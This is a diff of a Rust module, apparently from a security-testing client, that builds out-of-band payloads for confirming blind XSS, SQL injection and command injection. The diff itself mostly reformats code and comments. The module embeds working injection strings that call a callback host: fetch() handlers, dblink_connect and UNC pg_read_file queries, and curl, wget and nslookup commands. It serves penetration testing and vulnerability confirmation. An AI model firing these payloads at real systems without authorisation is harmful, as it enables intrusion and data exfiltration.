@@ -7,7 +7,7 @@
 //! etc.) expands into many on-the-wire forms so a single WAF / filter
 //! / context mismatch doesn't blind the whole confirmation step.
 //!
-//! ## Why this lives in interactsh
+//! ## Why this lives in interactsh-client
 //!
 //! The helpers are intentionally **OOB-server-agnostic**: every
 //! template takes a `callback_url` / `callback_dns` parameter rather
@@ -46,7 +46,7 @@ use std::collections::BTreeSet;
 /// # Parameters
 ///
 /// - `callback_url`: Absolute URL the embedded script / asset
-///   should request. Typically `interactsh::InteractshClient::generate_url(...).url`
+///   should request. Typically `interactsh_client::InteractshClient::generate_url(...).url`
 ///   wrapped in `http://` / `https://`.
 ///
 /// # Returns
@@ -67,13 +67,9 @@ pub fn blind_xss_payloads(callback_url: &str) -> Vec<String> {
     out.insert(format!(
         "<video><source onerror=\"fetch('{full_url}')\"></video>"
     ));
-    out.insert(format!(
-        "<input autofocus onfocus=\"fetch('{full_url}')\">"
-    ));
+    out.insert(format!("<input autofocus onfocus=\"fetch('{full_url}')\">"));
     // Bonus: encoded variant for filters that strip the literal '<script'
-    out.insert(format!(
-        "<a href=\"javascript:fetch('{full_url}')\">x</a>"
-    ));
+    out.insert(format!("<a href=\"javascript:fetch('{full_url}')\">x</a>"));
     out.into_iter().collect()
 }
 
@@ -131,7 +127,7 @@ pub enum SqliDialect {
     Oracle,
 }
 
-/// Derive the two callback forms a SQLi sink may need from one caller input.
+/// Derive the two callback forms a SQL injection sink may need from one caller input.
 ///
 /// `bare_host` is the DNS host alone (scheme, path, and port stripped), for
 /// UNC/SMB paths and hostname-only sinks (`DBMS_LDAP.init`, `UTL_INADDR`).
@@ -149,11 +145,7 @@ fn callback_forms(callback: &str) -> (String, String) {
         .split(['/', '?', '#'])
         .next()
         .unwrap_or(after_scheme);
-    let bare_host = authority
-        .split(':')
-        .next()
-        .unwrap_or(authority)
-        .to_string();
+    let bare_host = authority.split(':').next().unwrap_or(authority).to_string();
     let full_url = if callback.contains("://") {
         callback.to_string()
     } else {
@@ -162,12 +154,12 @@ fn callback_forms(callback: &str) -> (String, String) {
     (bare_host, full_url)
 }
 
-/// Returns a battery of blind SQLi payload variants that exfiltrate
+/// Returns a battery of blind SQL injection payload variants that exfiltrate
 /// over the network for `dialect`.
 ///
 /// `callback` may be a bare DNS host (`abc.oob.example`) or a full URL
 /// (`http://abc.oob.example/`); each template embeds whichever form it needs,
-/// derived via [`callback_forms`], so every emitted payload is well-formed.
+/// derived via `callback_forms`, so every emitted payload is well-formed.
 #[must_use]
 pub fn blind_sqli_payloads(callback: &str, dialect: SqliDialect) -> Vec<String> {
     let (bare_host, full_url) = callback_forms(callback);
@@ -223,9 +215,7 @@ pub fn blind_sqli_payloads(callback: &str, dialect: SqliDialect) -> Vec<String> 
             out.insert(format!(
                 "'; DO $$ BEGIN PERFORM dblink_connect('host={bare_host}'); END $$ -- "
             ));
-            out.insert(format!(
-                "'; SELECT pg_read_file('\\\\{bare_host}\\a') -- "
-            ));
+            out.insert(format!("'; SELECT pg_read_file('\\\\{bare_host}\\a') -- "));
         }
         SqliDialect::Oracle => {
             // UTL_HTTP / HTTPURITYPE need a full URL; DBMS_LDAP.init and
@@ -268,9 +258,7 @@ pub fn blind_cmdi_payloads(callback_dns: &str) -> Vec<String> {
     out.insert(format!("; wget {full_url}"));
     out.insert(format!("; ping -c 1 {bare_host}"));
     // Windows: PowerShell + ping with appropriate quoting.
-    out.insert(format!(
-        "& powershell -c \"Resolve-DnsName {bare_host}\""
-    ));
+    out.insert(format!("& powershell -c \"Resolve-DnsName {bare_host}\""));
     out.insert(format!("& ping -n 1 {bare_host}"));
     // Anti-filter: embed DNS in a $() with extra noise.
     out.insert(format!("`{{nslookup,{bare_host}}}`"));
@@ -376,7 +364,10 @@ mod tests {
                 s.starts_with("gopher://") || s.starts_with("dict://") || s.starts_with("file://")
             })
             .count();
-        assert_eq!(pivots, 3, "all three scheme pivots must survive dedup: {p:?}");
+        assert_eq!(
+            pivots, 3,
+            "all three scheme pivots must survive dedup: {p:?}"
+        );
         assert_dedup(&p);
     }
 
@@ -468,8 +459,14 @@ mod tests {
         // (`\\http://host:8080/path\a` is malformed); the bare host is derived.
         let p = blind_sqli_payloads("http://oob.test:8080/path", SqliDialect::MySql);
         for s in &p {
-            assert!(!s.contains("://"), "UNC payload must not contain a scheme: {s}");
-            assert!(s.contains("oob.test"), "UNC payload must contain the bare host: {s}");
+            assert!(
+                !s.contains("://"),
+                "UNC payload must not contain a scheme: {s}"
+            );
+            assert!(
+                s.contains("oob.test"),
+                "UNC payload must contain the bare host: {s}"
+            );
             assert!(
                 !s.contains("8080") && !s.contains("path"),
                 "UNC payload must drop port and path: {s}"
@@ -486,17 +483,26 @@ mod tests {
             .iter()
             .find(|s| s.contains("curl "))
             .expect("curl variant present");
-        assert!(curl.contains("curl http://oob.test"), "curl needs a full URL: {curl}");
+        assert!(
+            curl.contains("curl http://oob.test"),
+            "curl needs a full URL: {curl}"
+        );
         let unc = p
             .iter()
             .find(|s| s.contains("pg_read_file"))
             .expect("pg_read_file variant present");
-        assert!(!unc.contains("://"), "pg_read_file UNC must have no scheme: {unc}");
+        assert!(
+            !unc.contains("://"),
+            "pg_read_file UNC must have no scheme: {unc}"
+        );
         let dblink = p
             .iter()
             .find(|s| s.contains("dblink_connect"))
             .expect("dblink variant present");
-        assert!(dblink.contains("host=oob.test"), "dblink needs a bare host: {dblink}");
+        assert!(
+            dblink.contains("host=oob.test"),
+            "dblink needs a bare host: {dblink}"
+        );
     }
 
     #[test]
@@ -504,9 +510,9 @@ mod tests {
         let p = blind_cmdi_payloads("oob.test");
         assert!(p.len() >= 10);
         // Unix separators
-        assert!(p.iter().any(|s| s.starts_with(";")));
+        assert!(p.iter().any(|s| s.starts_with(';')));
         assert!(p.iter().any(|s| s.starts_with("&&")));
-        assert!(p.iter().any(|s| s.starts_with("|")));
+        assert!(p.iter().any(|s| s.starts_with('|')));
         // Subshell forms
         assert!(p.iter().any(|s| s.starts_with('`')));
         assert!(p.iter().any(|s| s.starts_with("$(")));
